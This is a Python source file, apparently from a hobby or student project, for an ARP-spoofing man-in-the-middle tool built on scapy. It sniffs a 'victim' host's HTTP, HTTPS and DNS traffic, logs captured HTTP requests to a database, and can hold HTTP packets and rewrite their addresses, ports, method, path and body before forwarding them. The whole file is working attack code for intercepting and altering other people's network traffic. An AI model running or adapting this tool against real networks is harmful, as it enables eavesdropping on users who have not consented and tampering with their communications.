from scapy.all import *
from scapy.layers.dns import DNS
from scapy.layers.inet import IP, TCP
from threading import Lock
from scapy.layers.l2 import Ether, getmacbyip
from mitm.arpspoofer import ArpSpoofer
from mitm.database import DataBase
from queue import Queue

NOT_SENT = Queue()
REQ_TYPES = ["get", "post", "head", "put", "delete", "connect", "options", "trace", "patch"]

def is_https(pack):
    # returns if the packet is https
    return TCP in pack and (pack[TCP].sport == 443 or pack[TCP].dport == 443)

def is_http(pack):
    # returns if the packet is http
    return Raw in pack and TCP in pack and (pack[TCP].sport == 80 or pack[TCP].dport == 80)

class Sniffer:
    def __init__(self, targetIP, gatewayIP, do_before_adding_to_database):
        self.spoofer = ArpSpoofer(targetIP, gatewayIP)
        self.db = DataBase(do_before_adding_to_database)
        self.packets = self.db.get_last()
        self.db.start()
        self.packets_lock = Lock()
        self.sendpac = True
        self.on = True
        self.updeted_packs = {}

    def start_spoofing(self):
        # start the arp spoofing
        if self.on:
            self.spoofer.start()

    def all_filter(self,packet):
        #filters if the packets are relevant
        return IP in packet and (DNS in packet
                                 or (TCP in packet and (packet[TCP].sport == 80 or packet[TCP].dport == 80
                                 or packet[TCP].sport == 443 or packet[TCP].dport == 443)
                                 or (UDP in packet and (packet[UDP].sport == 80 or packet[UDP].dport == 80))))

    def sniff_all(self):
        """
        sniffs the packets if on==true, sends them to a packet which navigates them
        """
        sniff(prn=self.navigate_packets, stop_filter=lambda x: not self.on)


    def set_on(self, set):
        # sets the var onD
        self.on = set

    def navigate_packets(self, pack: packet):
        """
        :param pack: packet
        navigates to router ot victim
        """
        if self.all_filter(pack):
            if self.is_from_victim(pack):
                self.handle_packets_from_victim(pack)
            elif self.is_from_router(pack):
                self.handle_packets_from_router(pack)



    def is_from_router(self, pack):
        """
        :return: if the packet came from the router
        """
        return pack[IP].dst == self.spoofer.targetIP and pack[Ether].src == getmacbyip(self.spoofer.gatewayIP)

    def is_from_victim(self,pack):
        """
        :return: if the packet came from the victim
        """
        return pack[IP].src == self.spoofer.targetIP and pack[Ether].dst == self.spoofer.sourceMAC.replace("-",":").lower()

    def set_sendpac(self, bool):
        # sets the var sendpac
        self.sendpac = bool

    def update_pack(self, packet_id: int, src_ip: str, dst_ip: str, req_type: str, req_params: str, data:str,
                    src_port: str, dst_port: str):
        """
        recives info about a packet that is required to change. changes the relevant fileds and adds it to the database.
        """
        for p in NOT_SENT.queue:
            if packet_id==p[1]:
                packet = p[0]
                self.updeted_packs[packet_id] = True
                if src_ip != None:
                    packet[IP].src = src_ip
                if dst_ip != None:
                    packet[IP].dst = dst_ip
                if data != None:
                    packet[Raw].load = data.encode()
                if req_type != None:
                    self.change_req_type(packet, req_type)
                if req_params != None:
                   self.change_req_params(req_params, packet)
                if src_port != None:
                    packet[TCP].sport = int(src_port)
                if dst_port != None:
                    packet[TCP].dport = int(dst_port)
                p = p[0]
                if p[IP].src == self.spoofer.targetIP:
                    self.db.write_to_victim_changed(self.packets, p[IP].src, p[IP].dst, self.find_req_type(p),
                                                    self.find_req_param(p), p[Raw].load, p[TCP].sport, p[TCP].dport)
                    with self.packets_lock:
                        self.packets += 1
                elif p[IP].src == self.spoofer.gatewayIP:
                    self.db.write_to_router_changed(self.packets, p[IP].src, p[IP].dst, self.find_req_type(p),
                                                    self.find_req_param(p), p[Raw].load, p[TCP].sport, p[TCP].dport)
                    with self.packets_lock:
                        self.packets += 1


    def send_packet(self, packet):
        """
        :param packet: packet
        :return: first of, if needed ip forwording is done. next, if sendpac==true
        it empties the queue and sends the packets inside of it.
        if not, it keeps the packet in the queue.
        """
        if Ether in packet and IP in packet:
            if self.is_from_victim(packet):
                # is from victim to router
                packet[Ether].dst = getmacbyip(self.spoofer.gatewayIP).replace("-", ":").upper()
                packet[Ether].src = self.spoofer.sourceMAC.replace("-", ":")
            elif self.is_from_router(packet):
                # if from router to victim
                packet[Ether].dst = getmacbyip(self.spoofer.targetIP).replace("-", ":").upper()
                packet[Ether].src = self.spoofer.sourceMAC.replace("-", ":")

        if not is_http(packet):
            sendp(packet, verbose=False)
        else:
            NOT_SENT.put((packet, self.packets-1))
            while self.sendpac and not NOT_SENT.empty():
                pac = NOT_SENT.get()
                sendp(pac[0], verbose=False)

    def check_rt(self, rt):
        for i in REQ_TYPES:
            if i == rt.lower():
                return True
        return False

    def find_req_type(self, packet) -> Optional[str]:
        """
        gets a packet
        :return: if it has a request type what is it?
        """
        try:
            txt = packet[Raw].load.decode()
            list = txt.split()
            if self.check_rt(list[0]):
                return list[0]
        except (UnicodeDecodeError,IndexError):
            return None

    def change_req_type(self, packet, newrt):
        """
        :param packet: packet
        :param newrt: new request type
        changes the current request type to the desired one.
        """
        txt: str = packet[Raw].load.decode()
        lst = txt.split(" ")
        lst[0] = newrt
        data = " ".join(lst)
        packet[Raw].load = data.encode()

    def find_req_param(self, packet):
        """
        :return: if it has request parameters what are they?
        """
        try:
            txt = packet[Raw].load.decode()
            list = txt.split()
            if self.check_rt(list[0]):
                return list[1]
        except:
            return None

    def change_req_params(self, req_params, packet):
        """
        :param req_params: new request parameters
        :param packet: packet
        changes the current request type to the desired one.
        """
        txt: str = packet[Raw].load.decode()
        lst = txt.split(" ")
        lst[1] = req_params
        data = " ".join(lst)
        packet[Raw].load = data.encode()


    def handle_packets_from_victim(self, pack):
        """
        recives packets from victim, puts the information in the victim table and send it using the send_packet func
        :param pack: packet
        """
        if is_http(pack):
            self.db.write_to_victim(self.packets, pack[IP].src, pack[IP].dst, self.find_req_type(pack),
                                    self.find_req_param(pack), str(pack[Raw].load)[2:-1], pack[TCP].sport, pack[TCP].dport)
            with self.packets_lock:
                self.packets += 1

        self.send_packet(pack)

    def handle_packets_from_router(self, pack):
        """
        recives packets from victim, puts the information in the router table and send it using the send_packet func
        :param pack: packet
        """
        if is_http(pack):
            self.db.write_to_router(self.packets, pack[IP].src, pack[IP].dst, self.find_req_type(pack),
                                    self.find_req_param(pack), pack[Raw].load, pack[TCP].sport, pack[TCP].dport)
            with self.packets_lock:
                self.packets += 1

        self.send_packet(pack)

